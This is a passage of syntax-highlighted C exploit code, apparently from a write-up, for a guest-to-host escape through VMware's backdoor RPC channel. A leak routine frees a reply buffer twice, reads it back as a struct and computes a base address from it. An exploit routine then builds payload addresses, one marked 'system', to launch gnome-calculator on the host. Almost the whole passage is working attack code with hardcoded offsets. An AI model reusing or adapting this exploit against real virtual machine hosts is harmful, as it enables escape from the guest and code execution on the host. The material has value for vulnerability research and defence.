class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the buffer....,bp:0x5555556DD3EF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Trying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFD0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token 